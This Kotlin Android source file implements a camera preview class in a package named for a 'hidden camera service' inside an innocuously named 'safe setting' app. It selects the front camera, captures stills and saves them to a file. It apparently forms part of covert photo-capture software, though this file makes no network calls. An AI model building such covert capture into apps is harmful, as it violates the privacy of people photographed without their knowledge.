package com.safe.setting.app.utils.hiddenCameraServiceUtils

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.ImageFormat
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.util.Log
import android.util.Size
import android.view.SurfaceHolder
import android.view.SurfaceView
import com.safe.setting.app.utils.hiddenCameraServiceUtils.HiddenCameraUtils.rotateBitmap
import com.safe.setting.app.utils.hiddenCameraServiceUtils.HiddenCameraUtils.saveImageFromFile
import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraRotation


@SuppressLint("ViewConstructor")
internal class CameraPreview(context: Context, private val mCameraCallbacks: CameraCallbacks) :
    SurfaceView(context), SurfaceHolder.Callback {

    private var mHolder: SurfaceHolder? = null
    private var cameraConfig: CameraConfig? = null

    lateinit var capReq: CaptureRequest.Builder
    private var cameraManager: CameraManager
    var handler22: Handler
    private var handlerThread: HandlerThread
    lateinit var cameraCaptureSession: CameraCaptureSession
    lateinit var cameraDevice: CameraDevice
    lateinit var imageReader: ImageReader

    init {
        println("started")
        cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        handlerThread = HandlerThread("videoThread")
        handlerThread.start()
        handler22 = Handler(handlerThread.looper)
        initSurfaceView()
    }

    private fun initSurfaceView() {
        Log.d("Init surface", "Surface view initialised")
        mHolder = holder
        mHolder!!.addCallback(this)
//        mHolder!!.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS)
        mHolder!!.setFixedSize(cameraSize!!.width, cameraSize!!.height)

        imageReader = ImageReader.newInstance(
            cameraSize!!.width,
            cameraSize!!.height, ImageFormat.JPEG, 3
        )

        imageReader.setOnImageAvailableListener({
            Log.d("Image available", "Image on available")
            val image = it?.acquireLatestImage()
            if (image != null) {
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes) // Read data from buffer into byte array
                val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                Log.d("Image available", bytes.size.toString())
                // Now bitmap should contain the decoded image
                Thread {

                    val rotatedBitmap: Bitmap? =
                        if (cameraConfig!!.imageRotation != CameraRotation.ROTATION_0)
                            bitmap!!.rotateBitmap(cameraConfig!!.imageRotation)
                        else bitmap

                    if (rotatedBitmap!!.saveImageFromFile(
                            cameraConfig!!.imageFile!!,
                            cameraConfig!!.imageFormat
                        )
                    )
                        Handler(Looper.getMainLooper()).post {
                            mCameraCallbacks.onImageCapture(
                                cameraConfig!!.imageFile!!
                            )
                        }
                    else Handler(Looper.getMainLooper()).post {
                        mCameraCallbacks.onCameraError(
                            CameraError.ERROR_IMAGE_WRITE_FAILED
                        )
                    }
                }.start()
            } else {
                // Handle the case where image is null
                Log.d("Error", "Image is null")
            }
            Log.d("Camera config", cameraConfig?.imageFile?.absolutePath.toString())
            Log.d("Camera config", cameraConfig?.imageFormat.toString())
            image!!.close()

        }, handler22)
    }

    override fun onLayout(b: Boolean, i: Int, i1: Int, i2: Int, i3: Int) {

    }


    override fun surfaceCreated(surfaceHolder: SurfaceHolder) {
    }

    @Suppress("DEPRECATION")
    @SuppressLint("MissingPermission")
    override fun surfaceChanged(surfaceHolder: SurfaceHolder, i: Int, i1: Int, i2: Int) {
        Log.d("Surface Changed", "surface changed")
        cameraManager.openCamera(cameraId, object :
            CameraDevice.StateCallback() {
            override fun onOpened(p0: CameraDevice) {
                Log.d("Opened", "Opened the camera")
                cameraDevice = p0
                capReq = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                capReq.addTarget(surfaceHolder.surface)

                cameraDevice.createCaptureSession(
                    listOf(
                        surfaceHolder.surface,
                        imageReader.surface
                    ), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(p0: CameraCaptureSession) {
                            cameraCaptureSession = p0
                            cameraCaptureSession.setRepeatingRequest(capReq.build(), null, null)
                        }

                        override fun onConfigureFailed(p0: CameraCaptureSession) {
                            Log.d("Failed", "failed camera capture session")
                        }

                    }, handler22
                )
            }

            override fun onDisconnected(p0: CameraDevice) {}

            override fun onError(p0: CameraDevice, p1: Int) {
                Log.d("Error", "error to open")
            }

        }, handler22)
    }

    override fun surfaceDestroyed(holder: SurfaceHolder) {}

    private fun getFrontFacingCameraId(): String {
        var cameraId = ""
        Log.d("Camera size", cameraManager.cameraIdList.size.toString())
        try {
            for (id in cameraManager.cameraIdList) {
                val characteristics = cameraManager.getCameraCharacteristics(id)
                val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    cameraId = id
                    break
                }
            }
        } catch (e: CameraAccessException) {
            e.printStackTrace()
        }
        return cameraId
    }

    fun startCameraInternal(cameraConfig: CameraConfig) {
        this.cameraConfig = cameraConfig
        requestLayout()
    }

    fun takePictureInternal() {
        capReq = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
        capReq.addTarget(imageReader.surface)
        cameraCaptureSession.capture(capReq.build(), null, null)
    }

    fun stopPreviewAndFreeCamera() {
        cameraDevice.close()
        handler22.removeCallbacksAndMessages(null)
        handlerThread.quitSafely()
    }

    companion object {
        var cameraSize: Size? = null
        var cameraId: String = "0"
    }
}